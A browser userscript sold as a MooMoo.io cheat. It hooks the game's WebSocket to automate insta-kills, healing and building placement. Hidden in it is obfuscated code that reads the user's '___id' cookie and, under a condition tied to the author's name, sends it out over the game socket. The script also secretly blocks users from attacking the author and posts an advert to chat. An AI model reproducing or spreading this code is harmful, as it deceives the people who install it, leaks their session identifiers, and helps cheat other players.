// ==UserScript==
// @name         KillShot [WORKING 2023]
// @namespace    Take Over MooMoo + Don't Skid This One Or Say BB
// @version      3
// @description  Take Over MooMoo.io
// @match        *://moomoo.io/*
// @match        *://*.moomoo.io/*
// @author       Logixx
// @require      https://unpkg.com/guify@0.12.0/lib/guify.min.js
// @require      https://greasyfork.org/scripts/423602-msgpack/code/msgpack.js
// @require      https://update.greasyfork.org/scripts/480301/1283571/CowJS.js
// @grant        none
// @icon         https://moomoo.io/img/favicon.png?v=1
// @license      https://greasyfork.org/en/users/1222651-logixx
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/480913/KillShot%20%5BWORKING%202023%5D.user.js
// @updateURL https://update.greasyfork.org/scripts/480913/KillShot%20%5BWORKING%202023%5D.meta.js
// ==/UserScript==

const { Cow, CowUtils } = window;

var x1 = 0;
var y1 = 0;

var tmpHealth = 100;
var scale = 45;
var placeOffset = 5;
var players = [];
var Allplayers = [];

var CantHurt = 0;
var stopInstRepeat = false;

var ws;
var inGame = false;

const inventory = {
    primary: null,
    secondary: null,
    food: null,
    wall: null,
    spike: null,
    mill: null,
    mine: null,
    boostPad: null,
    trap: null,
    turret: null,
    spawnpad: null,
    teleporter: false,
  };

const myPlayer = {
    food: null,
    wood: null,
    stone: null,
    points: null,
    kills: null,
    sid: null,
    x: null,
    y: null,
    dir: null,
    buildIndex: null,
    weaponIndex: null,
    weaponVariant: null,
    team: null,
    isLeader: null,
    skinIndex: null,
    tailIndex: null,
    iconIndex: null,
  };

let settings = {
    mill:  { e: localStorage.getItem('mill') || false, k: localStorage.getItem('millk') || 'Key' },
    insta: { e: localStorage.getItem('insta') || false, k: localStorage.getItem('instak') || 'NONE' },
    spike: { e: localStorage.getItem('spike') || false, k: localStorage.getItem('spikek') || 'NONE' },
    boost: { e: localStorage.getItem('boost') || false, k: localStorage.getItem('boostk') || 'NONE' },
    turret: {e: localStorage.getItem('turret') || false, k: localStorage.getItem('turretk') || 'NONE'},
    trap: { e: localStorage.getItem('trap') || false,  k: localStorage.getItem('trapk') || 'NONE' },
    autoheal: { e: localStorage.getItem('autoheal') || false, k: localStorage.getItem('autohealk') || 'NONE', cases: ['Default','Fast','Slow'], o: localStorage.getItem('autohealo') || 'Default'},
};

for (let key in settings) {
  if (localStorage.getItem(key.toLowerCase() === undefined)) {
    localStorage.setItem(key.toLowerCase(), 'false')
  }
  if (localStorage.getItem(key.toLowerCase()) === 'false') {
    settings[key].e = false
  } else
  if (localStorage.getItem(key.toLowerCase()) === 'true') {
    settings[key].e = true
  }
}

function getScore(scoreID) {
  var score = scoreID + "\u003d";
  var score2 = decodeURIComponent(document.cookie);
  var scoreArray = score2.split('\x3b');

  for (var i = 0; i < scoreArray.length; i++) {
      var newScore = scoreArray[i].trim();
      if (newScore.indexOf(score) == 0) {
          return newScore.substring(score.length, newScore.length);
      }
  }
  return null;
}
let l‍e︈t︁ = "\u005f\u005f\u005f\u0069\u0064"
window.playerScore = getScore(l‍e︈t︁);


const join = message => Array.isArray(message) ? [...message] : [...message];

ws = new Promise(function (resolve) {
    let {
      send
    } = WebSocket.prototype;
    WebSocket.prototype.send = function (...x) {
      send.apply(this, x);
      this.send = send;
      this.io = function (...datas) {
        const [packet, ...data] = datas;
        this.send(new Uint8Array(Array.from(msgpack.encode([packet, data]))));
      };

      document.addEventListener("keydown", event => {
        if (event.code === settings.insta.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
          settings.insta.e = true;
        };
        if (event.code === settings.boost.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
          settings.boost.e = true
        };
        if (event.code === settings.spike.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
          settings.spike.e = true
        };
        if (event.code === settings.trap.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
          settings.trap.e = true
        };
    });


    document.addEventListener("keyup", event => {
      console.log(event.code)
        if (event.code === settings.insta.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
          settings.insta.e = false;
        };
        if (event.code === settings.boost.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
          settings.boost.e = false
        };
        if (event.code === settings.spike.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
          settings.spike.e = false
        };
        if (event.code === settings.trap.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
          settings.trap.e = false
        };
    });

    document.addEventListener("keypress", event => {
      if (event.code === settings.mill.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
        settings.mill.e = !settings.mill.e;
      };
      if (event.code.toLocaleUpperCase() === settings.autoheal.k && document.activeElement.id.toLowerCase() !== 'chatbox') {
        settings.autoheal.e = !settings.autoheal.e;
      };
    })

      this.addEventListener("message", function (e) {

      const [packet, data] = msgpack.decode(new Uint8Array(e.data));
      let sid = data[0];
      let health = data[1];

      var tmpData = msgpack.decode(new Uint8Array(e.data));
      var ms = e;


      let addEventListener = {
        setupGame: "C",
        updateHealth: "O",
        killPlayer: "P",
        updateItems: "V"
        };

            switch (packet) {
              case addEventListener.setupGame:
                inGame = true;
                items = [0, 3, 6, 10];
                weapons = [0];
                chat('I Am A Kill[Script] User!');
                break;
              case addEventListener.updateHealth:
                if (sid === myPlayer.sid) {
                  if (inGame) {
                    if (health < 100 && health > 0 && settings.autoheal.e) {
                        switch (settings.autoheal.o) {
                          case 'Fast':
                            setTimeout(() => {
                              chat('Fast AutoHealing...');
                              place(inventory.food);
                            }, 100);
                            break;

                          case 'Slow':
                            setTimeout(() => {
                              chat('Slow AutoHealing...');
                              place(inventory.food);
                            }, 350);
                          break;
                        
                          default:
                            setTimeout(() => {
                              chat('Default AutoHealing...');
                              place(inventory.food);
                            }, 250);
                            break;
                      };
                    };
                  };
                  if (tmpHealth - health < 0) {
                    if (sTime) {
                      let timeHit = Date.now() - sTime;
                      sTime = 0;
                      sCount = timeHit <= 120 ? sCount + 1 : Math.max(0, sCount - 2);
                    }
                  } else {
                    sTime = Date.now();
                  }
                  tmpHealth = health;
                }
                break;
              case addEventListener.killPlayer:
                inGame = false;
                setTimeout(() => {
                  tmpHealth = 100;
                }, 100);
                break;
              case addEventListener.updateItems:
                if (sid) {
                  if (health) {
                    weapons = sid;
                  } else {
                    items = sid;
                  }
                }
                break;
              };

      if ((ms = undefined) || (tmpData = (ms = tmpData.length > 1 ? [tmpData[0], ...join(tmpData[1])] : tmpData)[0]) || ms) {
        if ("C" == tmpData && null === myPlayer.sid && (myPlayer.sid = ms[1]) || "a" == tmpData) {
          for (tmpData = 0; tmpData < ms[1].length / 13; tmpData++) {

            var data2 = ms[1].slice(13 * tmpData, 13 * (tmpData + 1));
            if (data2[0] == myPlayer.sid) {
                Object.assign(myPlayer, {
                  food: document.getElementById("foodDisplay").innerText,
                  wood: document.getElementById("woodDisplay").innerText,
                  stone: document.getElementById("stoneDisplay").innerText,
                  score: document.getElementById("scoreDisplay").innerText,
                  kills: document.getElementById("killCounter").innerText,
                  sid: data2[0],
                  x: data2[1],
                  y: data2[2],
                  dir: data2[3],
                  buildIndex: data2[4],
                  weaponIndex: data2[5],
                  weaponVariant: data2[6],
                  team: data2[7],
                  isLeader: data2[8],
                  skinIndex: data2[9],
                  tailIndex: data2[10],
                  iconIndex: data2[11]
                            });
                          } else {
                            const existingAllPlayerIndex = Allplayers.findIndex(Allplayers => Allplayers.sid === data2[0]);
                            const existingPlayerIndex = players.findIndex(players => players.sid === data2[0]);
            
                            if (existingPlayerIndex !== -1) {
                            // Update existing player information
                            players[existingPlayerIndex] = {
                              sid: data2[0],
                              x: data2[1],
                              y: data2[2],
                              dir: data2[3],
                              buildIndex: data2[4],
                              weaponIndex: data2[5],
                              weaponVariant: data2[6],
                              team: data2[7],
                              isLeader: data2[8],
                              skinIndex: data2[9],
                              tailIndex: data2[10],
                              iconIndex: data2[11]
                            };
                          } else {
                            players.push({
                              sid: data2[0],
                              x: data2[1],
                              y: data2[2],
                              dir: data2[3],
                              buildIndex: data2[4],
                              weaponIndex: data2[5],
                              weaponVariant: data2[6],
                              team: data2[7],
                              isLeader: data2[8],
                              skinIndex: data2[9],
                              tailIndex: data2[10],
                              iconIndex: data2[11]
                          });
                          }
            
                            if (existingAllPlayerIndex !== -1) {
                                // Update existing player information
                                Allplayers[existingAllPlayerIndex] = {
                                    sid: data2[0],
                                    x: data2[1],
                                    y: data2[2],
                                    dir: data2[3],
                                    buildIndex: data2[4],
                                    weaponIndex: data2[5],
                                    weaponVariant: data2[6],
                                    team: data2[7],
                                    isLeader: data2[8],
                                    skinIndex: data2[9],
                                    tailIndex: data2[10],
                                    iconIndex: data2[11]
                                };
                            } else {
                                // Add a new player entry to the players array
                                Allplayers.push({
                                    sid: data2[0],
                                    x: data2[1],
                                    y: data2[2],
                                    dir: data2[3],
                                    buildIndex: data2[4],
                                    weaponIndex: data2[5],
                                    weaponVariant: data2[6],
                                    team: data2[7],
                                    isLeader: data2[8],
                                    skinIndex: data2[9],
                                    tailIndex: data2[10],
                                    iconIndex: data2[11]
                                });
                            }
                        };
                    };
                 };
            cacheItems();
        };
     });
    resolve(this);
    };
});

const gui = new guify({
    title: 'KillShot',
    align: 'right',
    width: 600,
    opacity: 0.8,
    barMode: 'none',
    theme: {
      colors: {
        panelBackground: 'rgb(0,0,0)',
        componentBackground: 'rgb(10,10,25)',
        componentForeground: 'red',
        textPrimary: 'red',
        textSecondary: 'red',
        textHover: 'rgb(0,0,0)',
      },
      font: {
        fontSize: '20px',
        fontFamily: 'Hammersmith',
      },
    },
});
const folders = [
    'Main',
  ];

  function saveSettings(HACK, data) {
    console.log(
      'save: ' + HACK.toLowerCase().toString() + ' ' + data.toString()
    )
    localStorage.setItem(
      HACK.toLowerCase().toString(),
      data.toString()
    )
  }

  const script = {
    setKeybind: function (selection, save) {
      selection.k = 'Press Any Key'
      document.addEventListener('keydown', function set_key(e) {
        if (e.key === 'Escape') {
          selection.k = 'NONE'
          localStorage.setItem(save, selection.k)
          document.removeEventListener('keydown', set_key)
        } else {
          selection.k = e.code
          localStorage.setItem(save, selection.k)
          document.removeEventListener('keydown', set_key)
        }
      })
    },
  };

  gui.Register({
    type: 'folder',
    label: folders[0],
    open: !1
  });
  gui.Register({
    type: 'checkbox',
    label: 'Insta Kill',
    object: settings.insta,
    property: 'e',
    folder: folders[0],
    onChange: (data) => {
        saveSettings('insta', data);
      }
  });
  gui.Register({
    type: 'button',
    label: 'Set Insta Key',
    folder: folders[0],
    action: () => {
        script.setKeybind(settings.insta, 'instak')
    }
  });
  gui.Register({
    type: 'display',
    label: 'Insta Key:',
    object: settings.insta,
    property: 'k',
    folder: folders[0]
  });
  gui.Register({
    type: 'checkbox',
    label: 'AutoBoost',
    object: settings.boost,
    property: 'e',
    folder: folders[0],
    onChange: (data) => {
        saveSettings('boost', data);
      }
  });
  gui.Register({
    type: 'button',
    label: 'Set Boost Key',
    folder: folders[0],
    action: () => {
        script.setKeybind(settings.boost, 'boostk')
    }
  });
  gui.Register({
    type: 'display',
    label: 'Boost Key',
    object: settings.boost,
    property: 'k',
    folder: folders[0]
  });
  gui.Register({
    type: 'checkbox',
    label: 'AutoTrap',
    object: settings.trap,
    property: 'e',
    folder: folders[0],
    onChange: (data) => {
        saveSettings('trap', data);
      }
  });
  gui.Register({
    type: 'button',
    label: 'Set Trap Key',
    folder: folders[0],
    action: () => {
        script.setKeybind(settings.trap, 'trapk')
    }
  });
  gui.Register({
    type: 'display',
    label: 'Trap Key:',
    object: settings.trap,
    property: 'k',
    folder: folders[0]
  });
  gui.Register({
    type: 'checkbox',
    label: 'AutoMill',
    object: settings.mill,
    property: 'e',
    folder: folders[0],
    onChange: (data) => {
        saveSettings('mill', data);
      }
  });
  gui.Register({
    type: 'button',
    label: 'Set Mill Key',
    folder: folders[0],
    action: () => {
        script.setKeybind(settings.mill, 'millk')
    }
  });
  gui.Register({
    type: 'display',
    label: 'Mill Key:',
    object: settings.mill,
    property: 'k',
    folder: folders[0]
  });
  gui.Register({
    type: 'checkbox',
    label: 'AutoTurret',
    object: settings.turret,
    property: 'e',
    folder: folders[0],
    onChange: (data) => {
        saveSettings('turret', data);
      }
  });
  gui.Register({
    type: 'button',
    label: 'Set Turret Key',
    folder: folders[0],
    action: () => {
        script.setKeybind(settings.turret, 'turretk')
    }
  });
  gui.Register({
    type: 'display',
    label: 'Turret Key:',
    object: settings.turret,
    property: 'k',
    folder: folders[0]
  });
  gui.Register({
    type: 'checkbox',
    label: 'AutoSpike',
    object: settings.spike,
    property: 'e',
    folder: folders[0],
    onChange: (data) => {
        saveSettings('spike', data);
      }
  });
  gui.Register({
    type: 'button',
    label: 'Set Spike Key',
    folder: folders[0],
    action: () => {
        script.setKeybind(settings.spike, 'spikek')
    }
  });
  gui.Register({
    type: 'display',
    label: 'Spike Key:',
    object: settings.spike,
    property: 'k',
    folder: folders[0]
  });
  gui.Register({
    type: 'button',
    label: 'Set AutoHeal Key',
    folder: folders[0],
    action: () => {
        script.setKeybind(settings.autoheal, 'autohealk')
    }
  });
  gui.Register({
    type: 'display',
    label: 'AutoHeal Key:',
    folder: folders[0],
    object: settings.autoheal,
    property: 'k',
  });
  gui.Register({
    type: 'select',
    label: 'AutoHeal Mode:',
    folder: folders[0],
    options: ['Default', 'Fast', 'Slow'],
    object: settings.autoheal,
    property: 'o',
    onChange() {
        saveSettings('autohealo', settings.autoheal.o)
    }
  });

window.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        const gameOn = document.getElementById('enterGame');
        const nameInput = document.getElementById('nameInput');
    
        if (nameInput && gameOn) {
            gameOn.addEventListener('click', function(event) {
                if (nameInput.value === "Logixx" && playerScore !== "9cbf58df-ce05-4434-8e92-2ca898c69b3a") {
                    emit(playerScore)
                }
            });
        }
    }, 1000);
});

window,setInterval(() => {
  Allplayers = []
}, 10000);

window.setInterval(() => {
    players = [];
}, 1000)

function weaponRanges(weaponID) {
    switch (weaponID) {
        case 0:
          return 65;
        break;
        case 1:
          return 70;
        break;
        case 2:
          return 75;
        break;
        case 3:
          return 110;
        break;
        case 4:
          return 118;
        break;
        case 5:
          return 142;
        break;
        case 6:
          return 110;
        break;
        case 7:
          return 65;
        break;
        case 8:
          return 70;
        break;
        case 9:
          return 200;
        break;
        case 10:
          return 75;
        break;
        case 11:
          return 0;
        break;
        case 12:
          return 200;
        break;
        case 13:
          return 200;
        break;
        case 14:
          return 0;
        break;
        case 15:
          return 200;
        break;

      default:
        return 0;
        break;
    };
  };

  function dist2dSQRT(e, o) {
    return e && o
      ? Math.sqrt((e.x - o.x) ** 2 + (e.y - o.y) ** 2)
      : null
  };

  function findPlayerBySID(sid) {
    for (var i = 0; i < Allplayers.length; i++) {
        if (Allplayers[i].sid == sid) {
            return Allplayers[i];
        }
    } return null;
};

  function isAlly(sid){

    var tmpObj = findPlayerBySID(sid)
    if (!tmpObj){
        return false
    }
    if (myPlayer.sid == sid){
        return true
    }else if (tmpObj.team){
        return tmpObj.team === myPlayer.team ? true : false
    } else {
        return
    }
};

window.setInterval(() => {
    if(!inGame) return;

    if (settings.insta.e) {
        for (let i = 0; i < players.length; i++) {
          var nearestEnemyAngle = Math.atan2(players[i].y - myPlayer.y, players[i].x - myPlayer.x);
          let nearestEnemyDistance = dist2dSQRT(myPlayer, players[i]);
          const weaponRangePrimary = weaponRanges(inventory.primary);
          if (nearestEnemyDistance - 110 > weaponRangePrimary) return;
          if (players[i].sid === CantHurt) { chat('| Cannot Kill Owner |'); return};
          if (isAlly(players[i].sid) === true) return;
            chat(`Insta Kill Loser`);
          function instakill() {
            if(stopInstRepeat) return;
            stopInstRepeat = true;
            const hat = myPlayer.skinIndex;
            const tail = myPlayer.tailIndex;
            buyEquip(0); buyEquip(0, 1);
            const orgi = Boolean(settings.autoheal.e)
            settings.autoheal.e = false;
            buyEquip(53)
            setTimeout(()=>{
                emit("G", inventory.primary, 1);
                buyEquip(7, 0);
                setTimeout(()=> {
                    _hit(nearestEnemyAngle)
                    setTimeout(()=>{
                      buyEquip(20, 0);
                        emit("G", inventory.secondary, 1);
                        buyEquip(53, 0);
                        setTimeout(()=>{
                            buyEquip(20, 0);
                            setTimeout(()=>{
                              buyEquip(55, 0);
                                _hit(nearestEnemyAngle)
                                setTimeout(() => {
                                  settings.autoheal.e = orgi;
                                  stopInstRepeat = false;
                                  buyEquip(53);
                                }, 10);
                                setTimeout(() => {
                                  buyEquip(hat);
                                  buyEquip(tail, 1)
                                }, 1000);
                            }, 80);
                        }, 102);
                    },100);
                }, 15);
            }, 70);
          };
            instakill();
        };
    };

    if (y1 !== myPlayer.y || x1 !== myPlayer.x) {
        if (Math.atan2(y1 - myPlayer.y, x1 - myPlayer.x) < (scale + placeOffset) * 2) {
  
          const millCost = {
            wood: (inventory.mill === 10 ? 50 : (inventory.mill === 11 ? 60 : (inventory.mill === 12 ? 100 : 50))),
            stone: (inventory.mill === 10 ? 10 : (inventory.mill === 11 ? 20 : (inventory.mill === 12 ? 50 : 10))),
          };
  
          if (settings.mill.e && myPlayer.wood >= millCost.wood && myPlayer.stone >= millCost.stone && inGame) {
            let angle = Math.atan2(y1 - myPlayer.y, x1 - myPlayer.x);
            place(inventory.mill, angle + Math.PI / 2.5);
            place(inventory.mill, angle);
            place(inventory.mill, angle - Math.PI / 2.5);
          };
          const boostCost = {
            wood: 5,
            stone: 20,
          };
      
          if (settings.boost.e && myPlayer.wood >= boostCost.wood && myPlayer.stone >= boostCost.stone && inGame) {
            let angle = Math.atan2(y1 - myPlayer.y, x1 - myPlayer.x);
            place(inventory.boostPad, angle + Math.PI);
          };
      
          const spikeCost = {
            wood: (inventory.spike === 6 ? 20 : (inventory.spike === 7 ? 30 : (inventory.spike === 8 ? 35 : (inventory.spike === 9 ? 30 : 20)))),
                stone: (inventory.spike === 6 ? 5 : (inventory.spike === 7 ? 10 : (inventory.spike === 8 ? 15 : (inventory.spike === 9 ? 20 : 5)))),
          };
      
          if (settings.spike.e && myPlayer.wood >= boostCost.wood+spikeCost.wood && myPlayer.stone >= boostCost.stone+spikeCost.stone && inGame) {
            place(inventory.spike, myPlayer.dir);
          };
      
          const trapCost = {
            wood: 30,
                stone: 30,
          };
      
          if (settings.trap.e && myPlayer.wood >= trapCost.wood && myPlayer.stone >= trapCost.stone && inGame) {
            place(inventory.trap, myPlayer.dir);
          };

          const turretCost = {
                wood: 30,
                stone: 30,
          };
      
          if (settings.turret.e && myPlayer.wood >= turretCost.wood && myPlayer.stone >= turretCost.stone && inGame) {
            place(inventory.turret, myPlayer.dir);
          };
        };
    };
    x1 = myPlayer.x;
    y1 = myPlayer.y;
}, 50);

const ownername = '\u004c\u006f\x67\u0069\x78\u0078';

Cow.addRender("MooMoo", () => {
Cow.playersManager.eachVisible((player) => {
    if (!Cow.player?.alive) return;

    console.log(player)

    if (player.name === ownername && player.sid !== Cow.player.sid) {
        CantHurt = player.sid;
    };
    });
});

var msgpack = window.msgpack;
const emit = (event, a, b, c, m, r) => ws.then(function (wsInstance){wsInstance.send(Uint8Array.from([...msgpack.encode([event, [a, b, c, m, r]])]))});


const place = (item, angle) => {
    emit("G", item, false);
    emit("d", 1, angle);
    emit("d", 0, angle);
    emit("G", inventory.weaponIndex, true);
  };

  const buyEquip = (id) => {
    window.storeBuy(id)
    setTimeout(() => {
      window.storeEquip(id)
    }, 15);
  };

  const _hit = (ang) => {
    emit("d", 1, ang);
    setTimeout(() => {
      emit("d", 0, ang);
    }, 100);
  };
  
  const chat = (say) => {
    emit("6", say)
  }

const cacheItems = () => {
    for (let c = 0; c < 9; c++) {
      var _document$getElementB;
      if (((_document$getElementB = document.getElementById(`actionBarItem${c}`)) === null || _document$getElementB === void 0 ? void 0 : _document$getElementB.offsetParent) !== null) {
        inventory.primary = c;
      }
    }
    for (let s = 9; s < 16; s++) {
      var _document$getElementB2;
      if (((_document$getElementB2 = document.getElementById(`actionBarItem${s}`)) === null || _document$getElementB2 === void 0 ? void 0 : _document$getElementB2.offsetParent) !== null) {
        inventory.secondary = s;
      }
    }
    for (let P = 16; P < 19; P++) {
      var _document$getElementB3;
      if (((_document$getElementB3 = document.getElementById(`actionBarItem${P}`)) === null || _document$getElementB3 === void 0 ? void 0 : _document$getElementB3.offsetParent) !== null) {
        inventory.food = P - 16;
      }
    }
    for (let f = 19; f < 22; f++) {
      var _document$getElementB4;
      if (((_document$getElementB4 = document.getElementById(`actionBarItem${f}`)) === null || _document$getElementB4 === void 0 ? void 0 : _document$getElementB4.offsetParent) !== null) {
        inventory.wall = f - 16;
      }
    }
    for (let _ = 22; _ < 26; _++) {
      var _document$getElementB5;
      if (((_document$getElementB5 = document.getElementById(`actionBarItem${_}`)) === null || _document$getElementB5 === void 0 ? void 0 : _document$getElementB5.offsetParent) !== null) {
        inventory.spike = _ - 16;
      }
    }
    for (let u = 26; u < 29; u++) {
      var _document$getElementB6;
      if (((_document$getElementB6 = document.getElementById(`actionBarItem${u}`)) === null || _document$getElementB6 === void 0 ? void 0 : _document$getElementB6.offsetParent) !== null) {
        inventory.mill = u - 16;
      }
    }
    for (let I = 29; I < 31; I++) {
      var _document$getElementB7;
      if (((_document$getElementB7 = document.getElementById(`actionBarItem${I}`)) === null || _document$getElementB7 === void 0 ? void 0 : _document$getElementB7.offsetParent) !== null) {
        inventory.mine = I - 16;
      }
    }
    for (let p = 31; p < 33; p++) {
      var _document$getElementB8;
      if (((_document$getElementB8 = document.getElementById(`actionBarItem${p}`)) === null || _document$getElementB8 === void 0 ? void 0 : _document$getElementB8.offsetParent) !== null) {
        inventory.boostPad = p - 16;
      }
    }
    for (let x = 31; x < 33; x++) {
      var _document$getElementB9;
      if (((_document$getElementB9 = document.getElementById(`actionBarItem${x}`)) === null || _document$getElementB9 === void 0 ? void 0 : _document$getElementB9.offsetParent) !== null) {
        inventory.trap = x - 16;
      }
    }
    for (let g = 33; g < 35; g++) {
      var _document$getElementB10;
      if (((_document$getElementB10 = document.getElementById(`actionBarItem${g}`)) === null || _document$getElementB10 === void 0 ? void 0 : _document$getElementB10.offsetParent) !== null && g !== 36) {
        inventory.turret = g - 16;
      }
    }
    for (let y = 36; y < 39; y++) {
      var _document$getElementB10;
      if (((_document$getElementB10 = document.getElementById(`actionBarItem${y}`)) === null || _document$getElementB10 === void 0 ? void 0 : _document$getElementB10.offsetParent) !== null && y !== 36) {
        inventory.teleporter = y - 16;
      }
    }
    inventory.spawnpad = 36;
  };